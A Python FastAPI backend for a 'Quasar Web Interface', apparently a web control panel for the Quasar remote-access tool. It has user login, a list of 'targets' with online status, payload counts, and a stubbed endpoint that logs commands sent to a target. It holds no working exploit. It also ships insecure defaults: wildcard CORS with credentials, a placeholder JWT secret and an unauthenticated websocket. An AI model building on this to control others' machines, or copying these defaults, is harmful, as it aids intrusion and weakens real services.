from fastapi import FastAPI, Depends, HTTPException, status, WebSocket, WebSocketDisconnect
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from pymongo import MongoClient
from passlib.context import CryptContext
from jose import JWTError, jwt
from datetime import datetime, timedelta
import os
import json
import asyncio
import subprocess
import uuid
from typing import Dict, List, Optional
import psutil
from dotenv import load_dotenv

load_dotenv()

app = FastAPI(title="Quasar Web Interface", version="1.0.0")

# CORS Configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Database Configuration
MONGO_URL = os.getenv("MONGO_URL", "mongodb://localhost:27017/quasar_web")
client = MongoClient(MONGO_URL)
db = client.quasar_web

# JWT Configuration
JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY", "your-secret-key")
JWT_ALGORITHM = os.getenv("JWT_ALGORITHM", "HS256")
JWT_ACCESS_TOKEN_EXPIRE_MINUTES = int(os.getenv("JWT_ACCESS_TOKEN_EXPIRE_MINUTES", "1440"))

# Password hashing
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
security = HTTPBearer()

# WebSocket connections manager
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        self.active_connections.remove(websocket)

    async def send_personal_message(self, message: str, websocket: WebSocket):
        await websocket.send_text(message)

    async def broadcast(self, message: str):
        for connection in self.active_connections:
            await connection.send_text(message)

manager = ConnectionManager()

# Utility functions
def verify_password(plain_password, hashed_password):
    return pwd_context.verify(plain_password, hashed_password)

def get_password_hash(password):
    return pwd_context.hash(password)

def create_access_token(data: dict, expires_delta: Optional[timedelta] = None):
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(minutes=15)
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)
    return encoded_jwt

def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(credentials.credentials, JWT_SECRET_KEY, algorithms=[JWT_ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception
    except JWTError:
        raise credentials_exception
    
    user = db.users.find_one({"username": username})
    if user is None:
        raise credentials_exception
    return user

# Routes

@app.get("/")
async def root():
    return {"message": "Quasar Web Interface API", "version": "1.0.0"}

@app.post("/api/auth/register")
async def register(user_data: dict):
    username = user_data.get("username")
    password = user_data.get("password")
    email = user_data.get("email")
    
    if not username or not password or not email:
        raise HTTPException(status_code=400, detail="Username, password and email are required")
    
    # Check if user already exists
    if db.users.find_one({"username": username}):
        raise HTTPException(status_code=400, detail="Username already registered")
    
    if db.users.find_one({"email": email}):
        raise HTTPException(status_code=400, detail="Email already registered")
    
    # Create new user
    hashed_password = get_password_hash(password)
    user_id = str(uuid.uuid4())
    
    user_doc = {
        "_id": user_id,
        "username": username,
        "email": email,
        "password": hashed_password,
        "created_at": datetime.utcnow(),
        "is_active": True,
        "role": "user"
    }
    
    db.users.insert_one(user_doc)
    
    return {"message": "User registered successfully", "user_id": user_id}

@app.post("/api/auth/login")
async def login(login_data: dict):
    username = login_data.get("username")
    password = login_data.get("password")
    
    if not username or not password:
        raise HTTPException(status_code=400, detail="Username and password are required")
    
    user = db.users.find_one({"username": username})
    if not user or not verify_password(password, user["password"]):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    access_token_expires = timedelta(minutes=JWT_ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = create_access_token(
        data={"sub": user["username"]}, expires_delta=access_token_expires
    )
    
    return {
        "access_token": access_token,
        "token_type": "bearer",
        "user": {
            "id": user["_id"],
            "username": user["username"],
            "email": user["email"],
            "role": user["role"]
        }
    }

@app.get("/api/auth/me")
async def get_current_user_info(current_user = Depends(get_current_user)):
    return {
        "id": current_user["_id"],
        "username": current_user["username"],
        "email": current_user["email"],
        "role": current_user["role"],
        "created_at": current_user["created_at"]
    }

@app.get("/api/dashboard/stats")
async def get_dashboard_stats(current_user = Depends(get_current_user)):
    # Get user's targets/clients
    targets = list(db.targets.find({"user_id": current_user["_id"]}))
    active_targets = len([t for t in targets if t.get("status") == "online"])
    
    # Get recent activities
    recent_activities = list(db.activities.find(
        {"user_id": current_user["_id"]}
    ).sort("timestamp", -1).limit(10))
    
    # Get payloads count
    payloads_count = db.payloads.count_documents({"user_id": current_user["_id"]})
    
    return {
        "total_targets": len(targets),
        "active_targets": active_targets,
        "total_payloads": payloads_count,
        "recent_activities": recent_activities
    }

@app.get("/api/targets")
async def get_targets(current_user = Depends(get_current_user)):
    targets = list(db.targets.find({"user_id": current_user["_id"]}))
    return {"targets": targets}

@app.post("/api/targets/{target_id}/command")
async def send_command_to_target(target_id: str, command_data: dict, current_user = Depends(get_current_user)):
    target = db.targets.find_one({"_id": target_id, "user_id": current_user["_id"]})
    if not target:
        raise HTTPException(status_code=404, detail="Target not found")
    
    # TODO: Implement actual command sending to Quasar client
    command = command_data.get("command")
    
    # Log the activity
    activity = {
        "_id": str(uuid.uuid4()),
        "user_id": current_user["_id"],
        "target_id": target_id,
        "action": "command_sent",
        "details": {"command": command},
        "timestamp": datetime.utcnow()
    }
    db.activities.insert_one(activity)
    
    return {"message": "Command sent successfully", "command": command}

@app.websocket("/api/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            message_data = json.loads(data)
            
            # Handle different message types
            if message_data.get("type") == "ping":
                await websocket.send_text(json.dumps({"type": "pong"}))
            
    except WebSocketDisconnect:
        manager.disconnect(websocket)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8001)